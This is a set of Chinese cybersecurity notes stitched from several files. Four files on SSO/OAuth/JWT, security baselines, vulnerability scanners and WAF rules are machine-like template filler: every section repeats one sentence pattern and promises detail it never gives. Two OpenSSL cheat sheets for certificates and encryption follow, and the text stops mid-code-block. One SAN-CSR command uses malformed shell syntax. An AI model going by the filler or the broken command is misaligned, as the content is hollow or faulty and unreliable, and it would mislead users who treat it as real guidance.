<!-- ============ 文档分隔线：033-cybersecurity/032-IdentityAccessManagement.md ============ -->



## 1. SSO 单点登录

### 1.1 SAML 协议

SAML 协议是身份与访问管理的重要组成部分。本节详细介绍SAML 协议的核心概念、工作原理和实际应用。

**关键要点**：

- SAML 协议的定义与核心原理
- SAML 协议的实现方式与技术细节
- SAML 协议在实际场景中的应用与最佳实践
- SAML 协议的常见问题与解决方案

SAML 协议在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 1.2 CAS 协议

CAS 协议是身份与访问管理的重要组成部分。本节详细介绍CAS 协议的核心概念、工作原理和实际应用。

**关键要点**：

- CAS 协议的定义与核心原理
- CAS 协议的实现方式与技术细节
- CAS 协议在实际场景中的应用与最佳实践
- CAS 协议的常见问题与解决方案

CAS 协议在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

## 2. OAuth 2.0

### 2.1 四种授权模式

四种授权模式是身份与访问管理的重要组成部分。本节详细介绍四种授权模式的核心概念、工作原理和实际应用。

**关键要点**：

- 四种授权模式的定义与核心原理
- 四种授权模式的实现方式与技术细节
- 四种授权模式在实际场景中的应用与最佳实践
- 四种授权模式的常见问题与解决方案

四种授权模式在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 2.2 安全最佳实践

安全最佳实践是身份与访问管理的重要组成部分。本节详细介绍安全最佳实践的核心概念、工作原理和实际应用。

**关键要点**：

- 安全最佳实践的定义与核心原理
- 安全最佳实践的实现方式与技术细节
- 安全最佳实践在实际场景中的应用与最佳实践
- 安全最佳实践的常见问题与解决方案

安全最佳实践在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

## 3. OIDC

### 3.1 OIDC 与 OAuth 2.0

OIDC 与 OAuth 2.0是身份与访问管理的重要组成部分。本节详细介绍OIDC 与 OAuth 2.0的核心概念、工作原理和实际应用。

**关键要点**：

- OIDC 与 OAuth 2.0的定义与核心原理
- OIDC 与 OAuth 2.0的实现方式与技术细节
- OIDC 与 OAuth 2.0在实际场景中的应用与最佳实践
- OIDC 与 OAuth 2.0的常见问题与解决方案

OIDC 与 OAuth 2.0在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 3.2 ID Token 与 UserInfo

ID Token 与 UserInfo是身份与访问管理的重要组成部分。本节详细介绍ID Token 与 UserInfo的核心概念、工作原理和实际应用。

**关键要点**：

- ID Token 与 UserInfo的定义与核心原理
- ID Token 与 UserInfo的实现方式与技术细节
- ID Token 与 UserInfo在实际场景中的应用与最佳实践
- ID Token 与 UserInfo的常见问题与解决方案

ID Token 与 UserInfo在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

## 4. JWT 安全

### 4.1 JWT 结构

JWT 结构是身份与访问管理的重要组成部分。本节详细介绍JWT 结构的核心概念、工作原理和实际应用。

**关键要点**：

- JWT 结构的定义与核心原理
- JWT 结构的实现方式与技术细节
- JWT 结构在实际场景中的应用与最佳实践
- JWT 结构的常见问题与解决方案

JWT 结构在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 4.2 常见攻击

常见攻击是身份与访问管理的重要组成部分。本节详细介绍常见攻击的核心概念、工作原理和实际应用。

**关键要点**：

- 常见攻击的定义与核心原理
- 常见攻击的实现方式与技术细节
- 常见攻击在实际场景中的应用与最佳实践
- 常见攻击的常见问题与解决方案

常见攻击在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 4.3 最佳实践

最佳实践是身份与访问管理的重要组成部分。本节详细介绍最佳实践的核心概念、工作原理和实际应用。

**关键要点**：

- 最佳实践的定义与核心原理
- 最佳实践的实现方式与技术细节
- 最佳实践在实际场景中的应用与最佳实践
- 最佳实践的常见问题与解决方案

最佳实践在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。



<!-- ============ 文档分隔线：033-cybersecurity/033-SecurityBaseline.md ============ -->



## 1. CIS Benchmark

### 1.1 CIS 框架

CIS 框架是安全基线的重要组成部分。本节详细介绍CIS 框架的核心概念、工作原理和实际应用。

**关键要点**：

- CIS 框架的定义与核心原理
- CIS 框架的实现方式与技术细节
- CIS 框架在实际场景中的应用与最佳实践
- CIS 框架的常见问题与解决方案

CIS 框架在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 1.2 常用 Benchmark

常用 Benchmark是安全基线的重要组成部分。本节详细介绍常用 Benchmark的核心概念、工作原理和实际应用。

**关键要点**：

- 常用 Benchmark的定义与核心原理
- 常用 Benchmark的实现方式与技术细节
- 常用 Benchmark在实际场景中的应用与最佳实践
- 常用 Benchmark的常见问题与解决方案

常用 Benchmark在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

## 2. 等保 2.0

### 2.1 等保级别

等保级别是安全基线的重要组成部分。本节详细介绍等保级别的核心概念、工作原理和实际应用。

**关键要点**：

- 等保级别的定义与核心原理
- 等保级别的实现方式与技术细节
- 等保级别在实际场景中的应用与最佳实践
- 等保级别的常见问题与解决方案

等保级别在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 2.2 安全要求

安全要求是安全基线的重要组成部分。本节详细介绍安全要求的核心概念、工作原理和实际应用。

**关键要点**：

- 安全要求的定义与核心原理
- 安全要求的实现方式与技术细节
- 安全要求在实际场景中的应用与最佳实践
- 安全要求的常见问题与解决方案

安全要求在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

## 3. 系统加固

### 3.1 Linux 加固

Linux 加固是安全基线的重要组成部分。本节详细介绍Linux 加固的核心概念、工作原理和实际应用。

**关键要点**：

- Linux 加固的定义与核心原理
- Linux 加固的实现方式与技术细节
- Linux 加固在实际场景中的应用与最佳实践
- Linux 加固的常见问题与解决方案

Linux 加固在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 3.2 数据库加固

数据库加固是安全基线的重要组成部分。本节详细介绍数据库加固的核心概念、工作原理和实际应用。

**关键要点**：

- 数据库加固的定义与核心原理
- 数据库加固的实现方式与技术细节
- 数据库加固在实际场景中的应用与最佳实践
- 数据库加固的常见问题与解决方案

数据库加固在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 3.3 中间件加固

中间件加固是安全基线的重要组成部分。本节详细介绍中间件加固的核心概念、工作原理和实际应用。

**关键要点**：

- 中间件加固的定义与核心原理
- 中间件加固的实现方式与技术细节
- 中间件加固在实际场景中的应用与最佳实践
- 中间件加固的常见问题与解决方案

中间件加固在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

## 4. 自动化合规

### 4.1 OpenSCAP

OpenSCAP是安全基线的重要组成部分。本节详细介绍OpenSCAP的核心概念、工作原理和实际应用。

**关键要点**：

- OpenSCAP的定义与核心原理
- OpenSCAP的实现方式与技术细节
- OpenSCAP在实际场景中的应用与最佳实践
- OpenSCAP的常见问题与解决方案

OpenSCAP在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 4.2 Ansible 加固角色

Ansible 加固角色是安全基线的重要组成部分。本节详细介绍Ansible 加固角色的核心概念、工作原理和实际应用。

**关键要点**：

- Ansible 加固角色的定义与核心原理
- Ansible 加固角色的实现方式与技术细节
- Ansible 加固角色在实际场景中的应用与最佳实践
- Ansible 加固角色的常见问题与解决方案

Ansible 加固角色在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。



<!-- ============ 文档分隔线：033-cybersecurity/034-VulnerabilityScanTools.md ============ -->



## 1. Nmap

### 1.1 端口扫描

端口扫描是漏洞扫描工具的重要组成部分。本节详细介绍端口扫描的核心概念、工作原理和实际应用。

**关键要点**：

- 端口扫描的定义与核心原理
- 端口扫描的实现方式与技术细节
- 端口扫描在实际场景中的应用与最佳实践
- 端口扫描的常见问题与解决方案

端口扫描在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 1.2 服务识别

服务识别是漏洞扫描工具的重要组成部分。本节详细介绍服务识别的核心概念、工作原理和实际应用。

**关键要点**：

- 服务识别的定义与核心原理
- 服务识别的实现方式与技术细节
- 服务识别在实际场景中的应用与最佳实践
- 服务识别的常见问题与解决方案

服务识别在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 1.3 NSE 脚本

NSE 脚本是漏洞扫描工具的重要组成部分。本节详细介绍NSE 脚本的核心概念、工作原理和实际应用。

**关键要点**：

- NSE 脚本的定义与核心原理
- NSE 脚本的实现方式与技术细节
- NSE 脚本在实际场景中的应用与最佳实践
- NSE 脚本的常见问题与解决方案

NSE 脚本在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

## 2. Nessus

### 2.1 扫描策略

扫描策略是漏洞扫描工具的重要组成部分。本节详细介绍扫描策略的核心概念、工作原理和实际应用。

**关键要点**：

- 扫描策略的定义与核心原理
- 扫描策略的实现方式与技术细节
- 扫描策略在实际场景中的应用与最佳实践
- 扫描策略的常见问题与解决方案

扫描策略在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 2.2 报告分析

报告分析是漏洞扫描工具的重要组成部分。本节详细介绍报告分析的核心概念、工作原理和实际应用。

**关键要点**：

- 报告分析的定义与核心原理
- 报告分析的实现方式与技术细节
- 报告分析在实际场景中的应用与最佳实践
- 报告分析的常见问题与解决方案

报告分析在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

## 3. OpenVAS

### 3.1 部署与配置

部署与配置是漏洞扫描工具的重要组成部分。本节详细介绍部署与配置的核心概念、工作原理和实际应用。

**关键要点**：

- 部署与配置的定义与核心原理
- 部署与配置的实现方式与技术细节
- 部署与配置在实际场景中的应用与最佳实践
- 部署与配置的常见问题与解决方案

部署与配置在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 3.2 扫描任务

扫描任务是漏洞扫描工具的重要组成部分。本节详细介绍扫描任务的核心概念、工作原理和实际应用。

**关键要点**：

- 扫描任务的定义与核心原理
- 扫描任务的实现方式与技术细节
- 扫描任务在实际场景中的应用与最佳实践
- 扫描任务的常见问题与解决方案

扫描任务在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

## 4. 漏洞管理

### 4.1 CVSS 评分

CVSS 评分是漏洞扫描工具的重要组成部分。本节详细介绍CVSS 评分的核心概念、工作原理和实际应用。

**关键要点**：

- CVSS 评分的定义与核心原理
- CVSS 评分的实现方式与技术细节
- CVSS 评分在实际场景中的应用与最佳实践
- CVSS 评分的常见问题与解决方案

CVSS 评分在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 4.2 修复优先级

修复优先级是漏洞扫描工具的重要组成部分。本节详细介绍修复优先级的核心概念、工作原理和实际应用。

**关键要点**：

- 修复优先级的定义与核心原理
- 修复优先级的实现方式与技术细节
- 修复优先级在实际场景中的应用与最佳实践
- 修复优先级的常见问题与解决方案

修复优先级在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。



<!-- ============ 文档分隔线：033-cybersecurity/035-WAFRule.md ============ -->



## 1. WAF 架构

### 1.1 反向代理模式

反向代理模式是WAF规则的重要组成部分。本节详细介绍反向代理模式的核心概念、工作原理和实际应用。

**关键要点**：

- 反向代理模式的定义与核心原理
- 反向代理模式的实现方式与技术细节
- 反向代理模式在实际场景中的应用与最佳实践
- 反向代理模式的常见问题与解决方案

反向代理模式在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 1.2 透明模式

透明模式是WAF规则的重要组成部分。本节详细介绍透明模式的核心概念、工作原理和实际应用。

**关键要点**：

- 透明模式的定义与核心原理
- 透明模式的实现方式与技术细节
- 透明模式在实际场景中的应用与最佳实践
- 透明模式的常见问题与解决方案

透明模式在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

## 2. 规则引擎

### 2.1 ModSecurity

ModSecurity是WAF规则的重要组成部分。本节详细介绍ModSecurity的核心概念、工作原理和实际应用。

**关键要点**：

- ModSecurity的定义与核心原理
- ModSecurity的实现方式与技术细节
- ModSecurity在实际场景中的应用与最佳实践
- ModSecurity的常见问题与解决方案

ModSecurity在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 2.2 OWASP CRS

OWASP CRS是WAF规则的重要组成部分。本节详细介绍OWASP CRS的核心概念、工作原理和实际应用。

**关键要点**：

- OWASP CRS的定义与核心原理
- OWASP CRS的实现方式与技术细节
- OWASP CRS在实际场景中的应用与最佳实践
- OWASP CRS的常见问题与解决方案

OWASP CRS在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

## 3. 绕过技术

### 3.1 编码绕过

编码绕过是WAF规则的重要组成部分。本节详细介绍编码绕过的核心概念、工作原理和实际应用。

**关键要点**：

- 编码绕过的定义与核心原理
- 编码绕过的实现方式与技术细节
- 编码绕过在实际场景中的应用与最佳实践
- 编码绕过的常见问题与解决方案

编码绕过在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 3.2 分块传输

分块传输是WAF规则的重要组成部分。本节详细介绍分块传输的核心概念、工作原理和实际应用。

**关键要点**：

- 分块传输的定义与核心原理
- 分块传输的实现方式与技术细节
- 分块传输在实际场景中的应用与最佳实践
- 分块传输的常见问题与解决方案

分块传输在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 3.3 HTTP 参数污染

HTTP 参数污染是WAF规则的重要组成部分。本节详细介绍HTTP 参数污染的核心概念、工作原理和实际应用。

**关键要点**：

- HTTP 参数污染的定义与核心原理
- HTTP 参数污染的实现方式与技术细节
- HTTP 参数污染在实际场景中的应用与最佳实践
- HTTP 参数污染的常见问题与解决方案

HTTP 参数污染在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

## 4. 自定义规则

### 4.1 正则规则

正则规则是WAF规则的重要组成部分。本节详细介绍正则规则的核心概念、工作原理和实际应用。

**关键要点**：

- 正则规则的定义与核心原理
- 正则规则的实现方式与技术细节
- 正则规则在实际场景中的应用与最佳实践
- 正则规则的常见问题与解决方案

正则规则在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 4.2 速率限制

速率限制是WAF规则的重要组成部分。本节详细介绍速率限制的核心概念、工作原理和实际应用。

**关键要点**：

- 速率限制的定义与核心原理
- 速率限制的实现方式与技术细节
- 速率限制在实际场景中的应用与最佳实践
- 速率限制的常见问题与解决方案

速率限制在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 4.3 地理封锁

地理封锁是WAF规则的重要组成部分。本节详细介绍地理封锁的核心概念、工作原理和实际应用。

**关键要点**：

- 地理封锁的定义与核心原理
- 地理封锁的实现方式与技术细节
- 地理封锁在实际场景中的应用与最佳实践
- 地理封锁的常见问题与解决方案

地理封锁在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。



<!-- ============ 文档分隔线：033-cybersecurity/036-OpenSSLCert.md ============ -->


## 生成私钥

**基本写法：生成 RSA 私钥**
`openssl genrsa -out <文件> <位数>`
```bash
# 生成 2048 位 RSA 私钥
openssl genrsa -out private.key 2048
```

**基本写法：生成 4096 位私钥**
`openssl genrsa -out <文件> 4096`
```bash
# 生成 4096 位 RSA 私钥（更安全）
openssl genrsa -out private.key 4096
```

**基本写法：生成加密的私钥**
`openssl genrsa -aes256 -out <文件> <位数>`
```bash
# 使用 AES-256 加密私钥
openssl genrsa -aes256 -out private.key 2048
```

**基本写法：生成 EC 私钥**
`openssl ecparam -name <曲线> -genkey -noout -out <文件>`
```bash
# 生成 P-256 椭圆曲线私钥
openssl ecparam -name prime256v1 -genkey -noout -out ec_key.pem
```

**基本写法：从私钥提取公钥**
`openssl rsa -in <私钥> -pubout -out <公钥>`
```bash
# 从 RSA 私钥提取公钥
openssl rsa -in private.key -pubout -out public.key
```

---

## 生成证书签名请求（CSR）

**基本写法：生成 CSR**
`openssl req -new -key <私钥> -out <CSR文件>`
```bash
# 交互式生成 CSR
openssl req -new -key private.key -out request.csr
```

**基本写法：同时生成私钥和 CSR**
`openssl req -newkey rsa:2048 -nodes -keyout <私钥> -out <CSR>`
```bash
# 一步生成私钥和 CSR
openssl req -newkey rsa:2048 -nodes -keyout private.key -out request.csr
```

**基本写法：使用 subject 生成 CSR**
`openssl req -new -key <私钥> -out <CSR> -subj "<主题>"`
```bash
# 非交互式指定主题
openssl req -new -key private.key -out request.csr -subj "/C=CN/ST=Beijing/L=Beijing/O=MyOrg/CN=example.com"
```

**基本写法：带 SAN 的 CSR**
`openssl req -new -key <私钥> -out <CSR> -config <配置>`
```bash
# 生成带 Subject Alternative Names 的 CSR
openssl req -new -key private.key -out request.csr -config <(cat /etc/ssl/openssl.cnf <<(printf "[SAN]\nsubjectAltName=DNS:example.com,DNS:www.example.com"))
```

---

## 查看证书与 CSR

**基本写法：查看 CSR 信息**
`openssl req -text -noout -verify -in <CSR>`
```bash
# 查看 CSR 的详细信息
openssl req -text -noout -verify -in request.csr
```

**基本写法：查看证书信息**
`openssl x509 -text -noout -in <证书>`
```bash
# 查看证书完整信息
openssl x509 -text -noout -in cert.pem
```

**基本写法：查看证书有效期**
`openssl x509 -enddate -noout -in <证书>`
```bash
# 查看证书过期时间
openssl x509 -enddate -noout -in cert.pem
```

**基本写法：查看证书颁发者**
`openssl x509 -issuer -noout -in <证书>`
```bash
# 查看证书颁发者信息
openssl x509 -issuer -noout -in cert.pem
```

**基本写法：查看证书主题**
`openssl x509 -subject -noout -in <证书>`
```bash
# 查看证书主题信息
openssl x509 -subject -noout -in cert.pem
```

**基本写法：查看证书指纹**
`openssl x509 -fingerprint -sha256 -noout -in <证书>`
```bash
# 查看 SHA-256 指纹
openssl x509 -fingerprint -sha256 -noout -in cert.pem
```

---

## 生成自签名证书

**基本写法：生成自签名证书**
`openssl req -x509 -newkey rsa:2048 -keyout <私钥> -out <证书> -days <天数> -nodes`
```bash
# 生成 365 天有效期的自签名证书
openssl req -x509 -newkey rsa:2048 -keyout private.key -out cert.pem -days 365 -nodes
```

**基本写法：指定主题生成自签名证书**
`openssl req -x509 -newkey rsa:2048 -keyout <私钥> -out <证书> -days <天数> -nodes -subj "<主题>"`
```bash
# 非交互式生成自签名证书
openssl req -x509 -newkey rsa:2048 -keyout private.key -out cert.pem -days 365 -nodes -subj "/CN=localhost"
```

**基本写法：使用现有私钥生成自签名证书**
`openssl req -x509 -key <私钥> -out <证书> -days <天数>`
```bash
# 使用已有私钥生成证书
openssl req -x509 -key private.key -out cert.pem -days 365
```

---

## 证书签名

**基本写法：使用 CA 签发证书**
`openssl x509 -req -in <CSR> -CA <CA证书> -CAkey <CA私钥> -CAcreateserial -out <证书> -days <天数>`
```bash
# 用 CA 签发客户端证书
openssl x509 -req -in request.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out client.crt -days 365
```

**基本写法：使用自签名私钥签发证书**
`openssl x509 -req -in <CSR> -signkey <私钥> -out <证书>`
```bash
# 使用自签名私钥签发 CSR
openssl x509 -req -in request.csr -signkey private.key -out cert.pem
```

**基本写法：带扩展签发证书**
`openssl x509 -req -in <CSR> -CA <CA证书> -CAkey <CA私钥> -extfile <配置> -extensions <节> -out <证书>`
```bash
# 签发带扩展的证书
openssl x509 -req -in request.csr -CA ca.crt -CAkey ca.key -extfile <(printf "subjectAltName=DNS:example.com") -out cert.pem
```

---

## 证书格式转换

**基本写法：PEM 转 DER**
`openssl x509 -outform der -in <证书> -out <DER文件>`
```bash
# PEM 格式转 DER 格式
openssl x509 -outform der -in cert.pem -out cert.der
```

**基本写法：DER 转 PEM**
`openssl x509 -inform der -in <DER文件> -out <证书>`
```bash
# DER 格式转 PEM 格式
openssl x509 -inform der -in cert.der -out cert.pem
```

**基本写法：PKCS12 转 PEM**
`openssl pkcs12 -in <PFX文件> -out <证书> -nodes`
```bash
# PFX/P12 转 PEM（含私钥和证书）
openssl pkcs12 -in cert.pfx -out cert.pem -nodes
```

**基本写法：PEM 转 PKCS12**
`openssl pkcs12 -export -out <PFX文件> -inkey <私钥> -in <证书>`
```bash
# PEM 私钥和证书转 PFX
openssl pkcs12 -export -out cert.pfx -inkey private.key -in cert.pem
```

**基本写法：带 CA 证书链转 PKCS12**
`openssl pkcs12 -export -out <PFX文件> -inkey <私钥> -in <证书> -certfile <CA证书>`
```bash
# 包含 CA 证书链的 PFX
openssl pkcs12 -export -out cert.pfx -inkey private.key -in cert.pem -certfile ca.crt
```

---

## 验证证书

**基本写法：验证证书链**
`openssl verify -CAfile <CA证书> <证书>`
```bash
# 验证证书是否由 CA 签发
openssl verify -CAfile ca.crt client.crt
```

**基本写法：验证证书和私钥匹配**
`openssl x509 -noout -modulus -in <证书> | openssl md5; openssl rsa -noout -modulus -in <私钥> | openssl md5`
```bash
# 对比证书和私钥的 modulus 是否一致
openssl x509 -noout -modulus -in cert.pem | openssl md5
openssl rsa -noout -modulus -in private.key | openssl md5
```

**基本写法：验证 SSL 连接**
`openssl s_client -connect <主机>:<端口>`
```bash
# 测试 HTTPS 连接并查看证书链
openssl s_client -connect example.com:443
```

**基本写法：指定 SNI 验证**
`openssl s_client -connect <主机>:<端口> -servername <域名>`
```bash
# 指定 SNI 验证虚拟主机证书
openssl s_client -connect example.com:443 -servername example.com
```

**基本写法：只查看证书**
`openssl s_client -connect <主机>:<端口> -showcerts`
```bash
# 查看服务器返回的完整证书链
openssl s_client -connect example.com:443 -showcerts
```

---

## 证书撤销列表（CRL）

**基本写法：生成 CRL**
`openssl ca -gencrl -out <CRL文件>`
```bash
# 生成证书撤销列表
openssl ca -gencrl -out crl.pem
```

**基本写法：查看 CRL**
`openssl crl -text -noout -in <CRL文件>`
```bash
# 查看 CRL 内容
openssl crl -text -noout -in crl.pem
```

**基本写法：使用 CRL 验证证书**
`openssl verify -crl_check -CAfile <CA证书> -CRLfile <CRL文件> <证书>`
```bash
# 验证证书是否被撤销
openssl verify -crl_check -CAfile ca.crt -CRLfile crl.pem client.crt
```

---

## 证书信息提取

**基本写法：提取公钥**
`openssl x509 -pubkey -noout -in <证书>`
```bash
# 从证书提取公钥
openssl x509 -pubkey -noout -in cert.pem > public.key
```

**基本写法：提取序列号**
`openssl x509 -serial -noout -in <证书>`
```bash
# 获取证书序列号
openssl x509 -serial -noout -in cert.pem
```

**基本写法：提取有效期**
`openssl x509 -dates -noout -in <证书>`
```bash
# 获取证书起止日期
openssl x509 -dates -noout -in cert.pem
```

**基本写法：提取所有主题信息**
`openssl x509 -subject -nameopt RFC2253 -noout -in <证书>`
```bash
# 以 RFC2253 格式输出主题
openssl x509 -subject -nameopt RFC2253 -noout -in cert.pem
```

---

## 常用证书操作

**基本写法：检查证书过期时间**
`openssl x509 -enddate -noout -in <证书> | cut -d= -f2`
```bash
# 提取证书过期日期
openssl x509 -enddate -noout -in cert.pem | cut -d= -f2
```

**基本写法：批量检查证书过期**
`for f in *.pem; do echo "$f: $(openssl x509 -enddate -noout -in $f)"; done`
```bash
# 批量检查当前目录所有证书的过期时间
for f in *.pem; do echo "$f: $(openssl x509 -enddate -noout -in $f)"; done
```

**基本写法：从 HTTPS 服务提取证书**
`echo | openssl s_client -connect <主机>:443 2>/dev/null | openssl x509 -out <文件>`
```bash
# 从远程服务器下载证书
echo | openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -out cert.pem
```



<!-- ============ 文档分隔线：033-cybersecurity/037-OpenSSLEncrypt.md ============ -->


## 对称加密

**基本写法：AES 加密文件**
`openssl enc -aes-256-cbc -salt -pbkdf2 -in <输入> -out <输出>`
```bash
# 使用 AES-256-CBC 加密文件
openssl enc -aes-256-cbc -salt -pbkdf2 -in plaintext.txt -out encrypted.enc
```

**基本写法：AES 解密文件**
`openssl enc -d -aes-256-cbc -pbkdf2 -in <文件> -out <输出>`
```bash
# 解密 AES 加密的文件
openssl enc -d -aes-256-cbc -pbkdf2 -in encrypted.enc -out decrypted.txt
```

**基本写法：使用密码加密**
`openssl enc -aes-256-cbc -salt -pbkdf2 -pass pass:<密码> -in <输入> -out <输出>`
```bash
# 直接指定密码加密
openssl enc -aes-256-cbc -salt -pbkdf2 -pass pass:secret123 -in plaintext.txt -out encrypted.enc
```

**基本写法：使用密钥文件加密**
`openssl enc -aes-256-cbc -salt -pbkdf2 -pass file:<密钥文件> -in <输入> -out <输出>`
```bash
# 使用密钥文件加密
openssl enc -aes-256-cbc -salt -pbkdf2 -pass file:./keyfile -in plaintext.txt -out encrypted.enc
```

**基本写法：指定密钥和 IV 加密**
`openssl enc -aes-256-cbc -K <十六进制密钥> -iv <十六进制IV> -in <输入> -out <输出>`
```bash
# 使用指定的密钥和 IV 加密
openssl enc -aes-256-cbc -K 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef -iv 0123456789abcdef0123456789abcdef -in plaintext.txt -out encrypted.enc
```

---

## 支持的加密算法

**基本写法：列出所有支持的算法**
`openssl enc -list`
```bash
# 列出所有支持的加密算法
openssl enc -list
```

**基本写法：ChaCha20 加密**
`openssl enc -chacha20 -salt -pbkdf2 -in <输入> -out <输出>`
```bash
# 使用 ChaCha20 加密
openssl enc -chacha20 -salt -pbkdf2 -in plaintext.txt -out encrypted.enc
```

**基本写法：AES-128 加密**
`openssl enc -aes-128-cbc -salt -pbkdf2 -in <输入> -out <输出>`
```bash
# 使用 AES-128-CBC 加密
openssl enc -aes-128-cbc -salt -pbkdf2 -in plaintext.txt -out encrypted.enc
```

**基本写法：Camellia 加密**
`openssl enc -camellia-256-cbc -salt -pbkdf2 -in <输入> -out <输出>`
```bash
# 使用 Camellia-256 加密
openssl enc -camellia-256-cbc -salt -pbkdf2 -in plaintext.txt -out encrypted.enc
```

---

## 非对称加密（RSA）

**基本写法：使用公钥加密**
`openssl rsautl -encrypt -inkey <公钥> -pubin -in <输入> -out <输出>`
```bash
# 使用 RSA 公钥加密文件
openssl rsautl -encrypt -inkey public.key -pubin -in plaintext.txt -out encrypted.enc
```

**基本写法：使用私钥解密**
`openssl rsautl -decrypt -inkey <私钥> -in <文件> -out <输出>`
```bash
# 使用 RSA 私钥解密
openssl rsautl -decrypt -inkey private.key -in encrypted.enc -out decrypted.txt
```

**基本写法：使用 OAEP 填充加密**
`openssl rsautl -encrypt -oaep -inkey <公钥> -pubin -in <输入> -out <输出>`
```bash
# 使用 OAEP 填充方案更安全
openssl rsautl -encrypt -oaep -inkey public.key -pubin -in plaintext.txt -out encrypted.enc
```

**基本写法：查看 RSA 密钥信息**
`openssl rsa -in <私钥> -text -noout`
```bash
# 查看 RSA 私钥详细信息
openssl rsa -in private.key -text -noout
```

---

## 数字签名

**基本写法：使用 RSA 签名文件**
`openssl dgst -sha256 -sign <私钥> -out <签名> <文件>`
```bash
# 使用 SHA-256 和 RSA 私钥签名文件
openssl dgst -sha256 -sign private.key -out signature.sig document.pdf
```

**基本写法：验证签名**
`openssl dgst -sha256 -verify <公钥> -signature <签名> <文件>`
```bash
# 验证文件的数字签名
openssl dgst -sha256 -verify public.key -signature signature.sig document.pdf
```

**基本写法：使用 ECDSA 签名**
`openssl dgst -sha384 -sign <EC私钥> -out <签名> <文件>`
```bash
# 使用 EC 私钥签名
openssl dgst -sha384 -sign ec_key.pem -out signature.sig document.pdf
```

**基本写法：使用 pkeyutl 签名**
`openssl pkeyutl -sign -inkey <私钥> -in <文件> -out <签名>`
```bash
# 使用 pkeyutl 签名
openssl pkeyutl -sign -inkey private.key -in document.pdf -out signature.sig
```

**基本写法：使用 pkeyutl 验证**
`openssl pkeyutl -verify -inkey <公钥> -pubin -in <文件> -sigfile <签名>`
```bash
# 使用 pkeyutl 验证签名
openssl pkeyutl -verify -inkey public.key -pubin -in document.pdf -sigfile signature.sig
```

---

## 哈希计算

**基本写法：计算文件 SHA-256**
`openssl dgst -sha256 <文件>`
```bash
# 计算文件的 SHA-256 哈希
openssl dgst -sha256 document.pdf
```

**基本写法：计算文件 MD5**
`openssl dgst -md5 <文件>`
```bash
# 计算文件的 MD5 哈希
openssl dgst -md5 document.pdf
```

**基本写法：计算字符串哈希**
`echo -n "<字符串>" | openssl dgst -sha256`
```bash
# 计算字符串的 SHA-256 哈希
echo -n "hello world" | openssl dgst -sha256
```

**基本写法：列出所有摘要算法**
`openssl list -digest-algorithms`
```bash
# 列出所有支持的哈希算法
openssl list -digest-algorithms
```

**基本写法：计算 HMAC**
`openssl dgst -sha256 -hmac "<密钥>" <文件>`
```bash
# 计算文件的 HMAC-SHA256
openssl dgst -sha256 -hmac "secret_key" document.pdf
```

**基本写法：二进制哈希输出**
`openssl dgst -binary -sha256 <文件>`
```bash
# 输出二进制形式的哈希
openssl dgst -binary -sha256 document.pdf
```

---

## 随机数生成

**基本写法：生成随机字节**
`openssl rand -hex <字节数>`
```bash
# 生成 16 字节的随机十六进制字符串
openssl rand -hex 16
```

**基本写法：生成 Base64 随机数**
`openssl rand -base64 <字节数>`
```bash
# 生成 32 字节的 Base64 随机数
openssl rand -base64 32
```

**基本写法：生成二进制随机数**
`openssl rand <字节数> > <文件>`
```bash
# 生成 1024 字节随机数到文件
openssl rand 1024 > random.bin
```

**基本写法：使用随机数作为密钥**
`openssl rand -hex 32`
```bash
# 生成 256 位的十六进制密钥
openssl rand -hex 32
```

---

## Base64 编码解码

**基本写法：Base64 编码**
`openssl base64 -in <输入> -out <输出>`
```bash
# 编码文件为 Base64
openssl base64 -in plaintext.txt -out encoded.b64
```

**基本写法：Base64 解码**
`openssl base64 -d -in <文件> -out <输出>`
```bash
# 解码 Base64 文件
openssl base64 -d -in encoded.b64 -out decoded.txt
```

**基本写法：字符串编码**
`echo -n "<字符串>" | openssl base64`
```bash
